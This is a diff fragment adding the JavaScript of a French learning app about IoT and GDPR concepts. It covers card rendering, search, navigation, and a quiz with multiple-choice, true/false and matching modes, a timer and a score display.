+    title.textContent = fam.name;
+    header.appendChild(title);
+
+    familyGroup.appendChild(header);
+
+    const grid = document.createElement('div');
+    grid.className = 'cards-grid';
+
+    grouped[fam.id].forEach(card => {
+      const cardEl = document.createElement('div');
+      cardEl.className = 'card';
+      cardEl.style.setProperty('--fam-color', fam.color);
+      cardEl.style.setProperty('--card-bg-color', fam.bgColor);
+
+      cardEl.innerHTML = `
+        <div class="card-top">
+          <div class="card-name">${card.name}</div>
+        </div>
+        <div class="card-aka">${card.aka}</div>
+        <div class="card-desc">${card.desc}</div>
+        <div class="card-example">ex/ ${card.example}</div>
+      `;
+
+      grid.appendChild(cardEl);
+    });
+
+    familyGroup.appendChild(grid);
+    container.appendChild(familyGroup);
+  });
+}
+
+function updateCounter() {
+  const count = getFilteredCards().length;
+  document.getElementById('conceptCount').textContent = count;
+  document.getElementById('pluralS').textContent = count > 1 ? 's' : '';
+}
+
+document.getElementById('searchInput').addEventListener('input', (e) => {
+  searchQuery = e.target.value;
+  renderFamilies();
+  updateCounter();
+});
+
+// ============================================
+// NAVIGATION
+// ============================================
+
+document.querySelectorAll('.nav-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    const view = tab.dataset.view;
+
+    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+
+    document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
+
+    currentView = view;
+
+    if (view === 'encyclopedia') {
+      document.getElementById('encyclopediaView').classList.add('active');
+      document.getElementById('encyclopediaControls').style.display = 'flex';
+    } else {
+      document.getElementById('quizView').classList.add('active');
+      document.getElementById('encyclopediaControls').style.display = 'none';
+      renderQuizHome();
+    }
+  });
+});
+
+// ============================================
+// QUIZ — Utilitaires
+// ============================================
+
+let timerInterval = null;
+let matchState = { leftSel: null, rightSel: null, pairs: [] };
+const PAIR_COLORS = ['#00B4D8', '#f59e0b', '#22c55e', '#f97316'];
+
+function esc(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+function resetQuizPanels() {
+  ['quizHome', 'quizConfig', 'quizGame', 'quizResults'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.style.display = 'none';
+  });
+}
+
+// ============================================
+// QUIZ — Accueil
+// ============================================
+
+function renderQuizHome() {
+  resetQuizPanels();
+  const home = document.getElementById('quizHome');
+  home.style.display = 'block';
+  const total = getAllCards().length;
+  home.innerHTML = `
+    <h2 class="quiz-title">Mode Quiz</h2>
+    <p class="quiz-subtitle">Testez vos connaissances sur l'IoT et le RGPD — ${total} concepts disponibles</p>
+    <div class="quiz-modes">
+      <div class="quiz-mode-card" onclick="startQuizMode('qcm')">
+        <span class="quiz-mode-icon">&#10022;</span>
+        <h3>QCM</h3>
+        <p>On vous donne un <strong>nom de concept</strong> — trouvez sa <strong>définition exacte</strong> parmi 4 propositions</p>
+        <span class="quiz-mode-count">${total} concepts</span>
+      </div>
+      <div class="quiz-mode-card" onclick="startQuizMode('tf')">
+        <span class="quiz-mode-icon">&#8651;</span>
+        <h3>Vrai / Faux</h3>
+        <p>On vous soumet un <strong>concept + alias</strong> — vérifiez si la correspondance est correcte</p>
+        <span class="quiz-mode-count">Rapide</span>
+      </div>
+      <div class="quiz-mode-card" onclick="startQuizMode('match')">
+        <span class="quiz-mode-icon">&#8801;</span>
+        <h3>Association</h3>
+        <p>Reliez chaque <strong>concept</strong> à son <strong>alias</strong> en cliquant sur les paires — par lot de 4</p>
+        <span class="quiz-mode-count">Interactif</span>
+      </div>
+    </div>
+  `;
+}
+
+// ============================================
+// QUIZ — Configuration
+// ============================================
+
+function startQuizMode(mode) {
+  quizMode = mode;
+  resetQuizPanels();
+  renderQuizConfig();
+}
+
+function renderQuizConfig() {
+  const config = document.getElementById('quizConfig');
+  config.style.display = 'block';
+  const modeLabel = quizMode === 'qcm' ? 'QCM' : quizMode === 'tf' ? 'Vrai / Faux' : 'Association';
+  const familyOptions = families.map(f =>
+    `<option value="${f.id}">${esc(f.name)}</option>`
+  ).join('');
+
+  config.innerHTML = `
+    <div class="quiz-config">
+      <button class="quiz-back-link" onclick="renderQuizHome()">&#8592; Retour</button>
+      <h3 style="margin-bottom:var(--space-6);color:var(--color-text);">Configuration — ${modeLabel}</h3>
+
+      <div class="quiz-config-group">
+        <label class="quiz-config-label">Nombre de questions</label>
+        <div class="quiz-config-options">
+          ${[5,10,20,30].map(n =>
+            `<button class="quiz-config-btn ${quizConfig.count === n ? 'selected' : ''}" onclick="setQuizCount(${n})">${n}</button>`
+          ).join('')}
+        </div>
+      </div>
+
+      <div class="quiz-config-group">
+        <label class="quiz-config-label">Famille de cartes</label>
+        <select class="quiz-config-select" onchange="quizConfig.family = this.value">
+          <option value="all">Toutes les familles</option>
+          ${familyOptions}
+        </select>
+      </div>
+
+      <div class="quiz-config-group">
+        <label class="quiz-config-label">Chronomètre</label>
+        <div class="quiz-config-options">
+          <button class="quiz-config-btn ${!quizConfig.timer ? 'selected' : ''}" onclick="setQuizTimer(false)">Désactivé</button>
+          <button class="quiz-config-btn ${quizConfig.timer ? 'selected' : ''}" onclick="setQuizTimer(true)">30 s / question</button>
+        </div>
+      </div>
+
+      <button class="quiz-start-btn" onclick="startQuiz()">Démarrer &#8594;</button>
+    </div>
+  `;
+}
+
+function setQuizCount(n) { quizConfig.count = n; renderQuizConfig(); }
+function setQuizTimer(v) { quizConfig.timer = v; renderQuizConfig(); }
+
+// ============================================
+// QUIZ — Génération des questions
+// ============================================
+
+function startQuiz() {
+  if (timerInterval) clearInterval(timerInterval);
+
+  const allC = getAllCards();
+  const pool = quizConfig.family === 'all'
+    ? allC
+    : allC.filter(c => c.familyId === parseInt(quizConfig.family));
+
+  if (pool.length < 2) {
+    alert('Pas assez de cartes dans cette famille. Choisissez "Toutes les familles".');
+    return;
+  }
+
+  const count = Math.min(quizConfig.count, pool.length);
+  const selected = shuffle(pool).slice(0, count);
+
+  quizQuestions = [];
+
+  if (quizMode === 'qcm') {
+    // Question : "Définissez ce concept : [nom]"
+    // Options : 4 définitions (desc) dont 1 correcte
+    selected.forEach(card => {
+      const distractors = shuffle(allC.filter(c => c.name !== card.name)).slice(0, 3);
+      const options = shuffle([card, ...distractors]);
+      quizQuestions.push({
+        type: 'qcm',
+        conceptName: card.name,
+        correctDesc: card.desc,
+        options: options.map((c, i) => ({
+          key: String.fromCharCode(65 + i),
+          desc: c.desc,
+          isCorrect: c.name === card.name
+        }))
+      });
+    });
+
+  } else if (quizMode === 'tf') {
+    // Question : "Le terme [nom] correspond-il à cet alias ?"
+    // Vrai ou Faux (50/50)
+    selected.forEach(card => {
+      const useCorrect = Math.random() > 0.5;
+      const shownAka = useCorrect
+        ? card.aka
+        : shuffle(allC.filter(c => c.name !== card.name))[0].aka;
+      quizQuestions.push({
+        type: 'tf',
+        conceptName: card.name,
+        shownAka: shownAka,
+        isCorrectStatement: useCorrect,
+        correctAka: card.aka
+      });
+    });
+
+  } else {
+    // Association : groupes de 4 (ou moins si fin de pool)
+    for (let i = 0; i < selected.length; i += 4) {
+      const group = selected.slice(i, Math.min(i + 4, selected.length));
+      if (group.length < 2) break;
+      quizQuestions.push({
+        type: 'match',
+        cards: group,
+        shuffledAkas: shuffle(group.map(c => c.aka))
+      });
+    }
+    if (quizQuestions.length === 0) {
+      alert('Pas assez de cartes pour le mode Association (minimum 2).');
+      return;
+    }
+  }
+
+  currentQuestion = 0;
+  userAnswers = [];
+  quizStartTime = Date.now();
+
+  resetQuizPanels();
+  document.getElementById('quizGame').style.display = 'block';
+  renderQuestion();
+}
+
+// ============================================
+// QUIZ — Rendu des questions
+// ============================================
+
+function progressBar(current, total) {
+  const pct = (current / total) * 100;
+  return `
+    <div class="quiz-progress-bar">
+      <div class="quiz-progress-fill" style="width:${pct}%"></div>
+    </div>
+    <div class="quiz-progress-text">Question ${current + 1} / ${total}</div>
+  `;
+}
+
+function renderQuestion() {
+  if (currentQuestion >= quizQuestions.length) {
+    showQuizResults();
+    return;
+  }
+  if (timerInterval) clearInterval(timerInterval);
+
+  const q = quizQuestions[currentQuestion];
+  const game = document.getElementById('quizGame');
+
+  const timerHtml = quizConfig.timer
+    ? `<div class="quiz-timer" id="qTimer">30</div>`
+    : '';
+
+  if (q.type === 'qcm') {
+    const optionsHtml = q.options.map((opt, idx) => `
+      <button class="quiz-answer-btn" data-correct="${opt.isCorrect}" onclick="answerQcm(this)">
+        <span class="quiz-answer-key">${String.fromCharCode(65 + idx)}</span>${esc(opt.desc)}
+      </button>
+    `).join('');
+
+    game.innerHTML = `
+      ${progressBar(currentQuestion, quizQuestions.length)}
+      ${timerHtml}
+      <div class="quiz-question-card">
+        <div class="quiz-question-label">QCM — Définissez ce concept</div>
+        <div class="quiz-concept-highlight">${esc(q.conceptName)}</div>
+        <div class="quiz-answers" id="qAnswers">${optionsHtml}</div>
+        <div class="quiz-feedback" id="qFeedback"></div>
+        <button class="quiz-next-btn" id="qNext" onclick="advanceQuestion()">
+          ${currentQuestion < quizQuestions.length - 1 ? 'Question suivante &#8594;' : 'Voir les résultats &#8594;'}
+        </button>
+      </div>
+    `;
+
+  } else if (q.type === 'tf') {
+    game.innerHTML = `
+      ${progressBar(currentQuestion, quizQuestions.length)}
+      ${timerHtml}
+      <div class="quiz-question-card">
+        <div class="quiz-question-label">Vrai / Faux</div>
+        <div class="quiz-question-text">
+          Le terme <strong>${esc(q.conceptName)}</strong> correspond-il à cet alias ?
+        </div>
+        <div class="quiz-tf-aka">${esc(q.shownAka)}</div>
+        <div class="quiz-tf-buttons">
+          <button class="quiz-tf-btn" id="btnV" onclick="answerTf(this, true)">V — Vrai</button>
+          <button class="quiz-tf-btn" id="btnF" onclick="answerTf(this, false)">F — Faux</button>
+        </div>
+        <div class="quiz-feedback" id="qFeedback"></div>
+        <button class="quiz-next-btn" id="qNext" onclick="advanceQuestion()">
+          ${currentQuestion < quizQuestions.length - 1 ? 'Question suivante &#8594;' : 'Voir les résultats &#8594;'}
+        </button>
+      </div>
+    `;
+
+  } else {
+    renderMatchQuestion(q);
+  }
+
+  if (quizConfig.timer) startTimer('qTimer');
+}
+
+// ============================================
+// QUIZ — Réponses QCM
+// ============================================
+
+function answerQcm(btn) {
+  if (timerInterval) clearInterval(timerInterval);
+  const allBtns = document.querySelectorAll('#qAnswers .quiz-answer-btn');
+  allBtns.forEach(b => {
+    b.disabled = true;
+    if (b.dataset.correct === 'true') b.classList.add('answer-correct');
+  });
+
+  const isCorrect = btn.dataset.correct === 'true';
+  if (!isCorrect) btn.classList.add('answer-wrong');
+  userAnswers.push({ correct: isCorrect });
+
+  const fb = document.getElementById('qFeedback');
+  fb.textContent = isCorrect ? 'Bonne réponse !' : 'Incorrect — la bonne définition est mise en évidence en vert.';
+  fb.className = `quiz-feedback show ${isCorrect ? 'feedback-ok' : 'feedback-ko'}`;
+
+  document.getElementById('qNext').className = 'quiz-next-btn visible';
+}
+
+// ============================================
+// QUIZ — Réponses Vrai/Faux
+// ============================================
+
+function answerTf(btn, givenTrue) {
+  if (timerInterval) clearInterval(timerInterval);
+  const q = quizQuestions[currentQuestion];
+  const isCorrect = (givenTrue === q.isCorrectStatement);
+  userAnswers.push({ correct: isCorrect });
+
+  const btnV = document.getElementById('btnV');
+  const btnF = document.getElementById('btnF');
+  btnV.disabled = true;
+  btnF.disabled = true;
+
+  // Afficher la bonne réponse en vert
+  if (q.isCorrectStatement) {
+    btnV.classList.add('answer-correct');
+    if (!givenTrue) btnF.classList.add('answer-wrong');
+  } else {
+    btnF.classList.add('answer-correct');
+    if (givenTrue) btnV.classList.add('answer-wrong');
+  }
+
+  const fb = document.getElementById('qFeedback');
+  if (!isCorrect) {
+    fb.innerHTML = `Incorrect. L'alias réel de <strong>${esc(q.conceptName)}</strong> est : <em>${esc(q.correctAka)}</em>`;
+    fb.className = 'quiz-feedback show feedback-ko';
+  } else {
+    fb.textContent = 'Bonne réponse !';
+    fb.className = 'quiz-feedback show feedback-ok';
+  }
+
+  document.getElementById('qNext').className = 'quiz-next-btn visible';
+}
+
+// ============================================
+// QUIZ — Mode Association
+// ============================================
+
+function renderMatchQuestion(q) {
+  matchState = { leftSel: null, rightSel: null, pairs: [] };
+  const game = document.getElementById('quizGame');
+
+  const leftHtml = q.cards.map((c, i) => `
+    <div class="match-item match-left" id="ml_${i}" onclick="selectLeft(${i})">${esc(c.name)}</div>
+  `).join('');
+
+  const rightHtml = q.shuffledAkas.map((aka, i) => `
+    <div class="match-item match-right" id="mr_${i}" onclick="selectRight(${i})">${esc(aka)}</div>
+  `).join('');
+
+  game.innerHTML = `
+    ${progressBar(currentQuestion, quizQuestions.length)}
+    <div class="quiz-question-card">
+      <div class="quiz-question-label">Association — Cliquez un concept puis son alias pour former une paire</div>
+      <div class="quiz-match-container">
+        <div>
+          <div class="quiz-match-col-header">Concepts</div>
+          <div id="matchLeft">${leftHtml}</div>
+        </div>
+        <div>
+          <div class="quiz-match-col-header">Alias</div>
+          <div id="matchRight">${rightHtml}</div>
+        </div>
+      </div>
+      <div id="matchPairs" class="match-pairs-display"></div>
+      <button class="quiz-next-btn" id="matchValidate" onclick="validateMatch()">
+        Valider les associations &#8594;
+      </button>
+    </div>
+  `;
+}
+
+function selectLeft(idx) {
+  const q = quizQuestions[currentQuestion];
+  if (matchState.pairs.find(p => p.li === idx)) return;
+
+  if (matchState.leftSel === idx) {
+    document.getElementById('ml_' + idx).classList.remove('match-selected');
+    matchState.leftSel = null;
+    return;
+  }
+  if (matchState.leftSel !== null) {
+    const prev = document.getElementById('ml_' + matchState.leftSel);
+    if (prev) prev.classList.remove('match-selected');
+  }
+  matchState.leftSel = idx;
+  document.getElementById('ml_' + idx).classList.add('match-selected');
+  tryPair(q);
+}
+
+function selectRight(idx) {
+  const q = quizQuestions[currentQuestion];
+  if (matchState.pairs.find(p => p.ri === idx)) return;
+
+  if (matchState.rightSel === idx) {
+    document.getElementById('mr_' + idx).classList.remove('match-selected');
+    matchState.rightSel = null;
+    return;
+  }
+  if (matchState.rightSel !== null) {
+    const prev = document.getElementById('mr_' + matchState.rightSel);
+    if (prev) prev.classList.remove('match-selected');
+  }
+  matchState.rightSel = idx;
+  document.getElementById('mr_' + idx).classList.add('match-selected');
+  tryPair(q);
+}
+
+function tryPair(q) {
+  if (matchState.leftSel === null || matchState.rightSel === null) return;
+
+  const li = matchState.leftSel;
+  const ri = matchState.rightSel;
+  const color = PAIR_COLORS[matchState.pairs.length % PAIR_COLORS.length];
+
+  matchState.pairs.push({ li, ri, color });
+
+  const le = document.getElementById('ml_' + li);
+  const re = document.getElementById('mr_' + ri);
+  le.classList.remove('match-selected');
+  re.classList.remove('match-selected');
+  le.classList.add('match-paired');
+  re.classList.add('match-paired');
+  le.style.borderColor = color;
+  re.style.borderColor = color;
+  le.style.color = color;
+  re.style.color = color;
+
+  matchState.leftSel = null;
+  matchState.rightSel = null;
+
+  // Affichage des paires confirmées
+  const pairsEl = document.getElementById('matchPairs');
+  pairsEl.innerHTML = matchState.pairs.map(p => `
+    <div class="match-pair-badge" style="border-color:${p.color};color:${p.color};">
+      <span class="pair-name">${esc(q.cards[p.li].name)}</span>
+      <span class="pair-sep">&#8594;</span>
+      <span>${esc(q.shuffledAkas[p.ri])}</span>
+    </div>
+  `).join('');
+
+  // Quand toutes les paires sont formées : afficher "Valider"
+  if (matchState.pairs.length >= q.cards.length) {
+    document.getElementById('matchValidate').className = 'quiz-next-btn visible';
+  }
+}
+
+function validateMatch() {
+  const q = quizQuestions[currentQuestion];
+  if (timerInterval) clearInterval(timerInterval);
+
+  let correct = 0;
+  const resultHtml = matchState.pairs.map(p => {
+    const card = q.cards[p.li];
+    const selectedAka = q.shuffledAkas[p.ri];
+    const ok = card.aka === selectedAka;
+    if (ok) correct++;
+    return `
+      <div class="match-pair-badge ${ok ? 'pair-ok' : 'pair-ko'}">
+        <span class="pair-name">${esc(card.name)}</span>
+        <span class="pair-sep">&#8594;</span>
+        <span>${esc(selectedAka)}</span>
+        ${!ok ? `<span class="pair-correction">(attendu&nbsp;: ${esc(card.aka)})</span>` : ''}
+      </div>
+    `;
+  }).join('');
+
+  const allCorrect = correct === q.cards.length;
+  userAnswers.push({ correct: allCorrect, score: `${correct}/${q.cards.length}` });
+
+  document.getElementById('matchPairs').innerHTML = resultHtml;
+  const validateBtn = document.getElementById('matchValidate');
+  validateBtn.textContent = allCorrect
+    ? `Parfait ${correct}/${q.cards.length} — Continuer \u2192`
+    : `${correct}/${q.cards.length} correct — Continuer \u2192`;
+  validateBtn.onclick = advanceQuestion;
+}
+
+// ============================================
+// QUIZ — Navigation et timer
+// ============================================
+
+function advanceQuestion() {
+  if (timerInterval) clearInterval(timerInterval);
+  currentQuestion++;
+  renderQuestion();
+}
+
+function startTimer(timerId) {
+  let t = 30;
+  const el = document.getElementById(timerId);
+  if (!el) return;
+
+  timerInterval = setInterval(() => {
+    t--;
+    el.textContent = t;
+    if (t <= 10) el.classList.add('warning');
+    if (t <= 3)  el.classList.add('critical');
+    if (t <= 0) {
+      clearInterval(timerInterval);
+      // Temps écoulé : réponse fausse + avancer
+      userAnswers.push({ correct: false });
+      currentQuestion++;
+      renderQuestion();
+    }
+  }, 1000);
+}
+
+// ============================================
+// QUIZ — Résultats
+// ============================================
+
+function showQuizResults() {
+  if (timerInterval) clearInterval(timerInterval);
+  resetQuizPanels();
+
+  const total = userAnswers.length;
+  const correct = userAnswers.filter(a => a.correct).length;
+  const pct = total > 0 ? Math.round((correct / total) * 100) : 0;
+
+  const elapsed = Math.round((Date.now() - quizStartTime) / 1000);
+  const mm = String(Math.floor(elapsed / 60)).padStart(2, '0');
+  const ss = String(elapsed % 60).padStart(2, '0');
+
+  let message, cls;
+  if (pct === 100) { message = 'Parfait — maîtrise totale !'; cls = 'score-perfect'; }
+  else if (pct >= 80) { message = 'Excellent — très bonnes connaissances.'; cls = 'score-great'; }
+  else if (pct >= 60) { message = 'Bien — continuez à approfondir.'; cls = 'score-good'; }
+  else if (pct >= 40) { message = 'À retravailler — consultez l\'encyclopédie.'; cls = 'score-medium'; }
+  else { message = 'À reprendre depuis le début.'; cls = 'score-low'; }
+
+  const modeLabel = quizMode === 'qcm' ? 'QCM' : quizMode === 'tf' ? 'Vrai / Faux' : 'Association';
+
+  const results = document.getElementById('quizResults');
+  results.style.display = 'block';
+  results.innerHTML = `
+    <div class="quiz-score ${cls}">${pct}%</div>
+    <div class="quiz-result-message">${message}</div>
+    <div class="quiz-result-stats">
+      <div class="quiz-stat">
+        <div class="quiz-stat-label">Bonnes réponses</div>
+        <div class="quiz-stat-value">${correct} / ${total}</div>
+      </div>
+      <div class="quiz-stat">
+        <div class="quiz-stat-label">Mode</div>
+        <div class="quiz-stat-value">${modeLabel}</div>
+      </div>
+      <div class="quiz-stat">
+        <div class="quiz-stat-label">Temps</div>
+        <div class="quiz-stat-value">${mm}:${ss}</div>
+      </div>
+    </div>
+    <button class="quiz-back-btn" onclick="renderQuizHome()">Rejouer</button>
+  `;
+}
+
+// ============================================
+// INITIALIZATION
+// ============================================
+
+document.addEventListener('DOMContentLoaded', () => {
+  applyTheme(currentTheme);
+  renderFilterPills();
+  renderFamilies();
+  updateCounter();
+});
+</script>
+
+</body>
+</html>
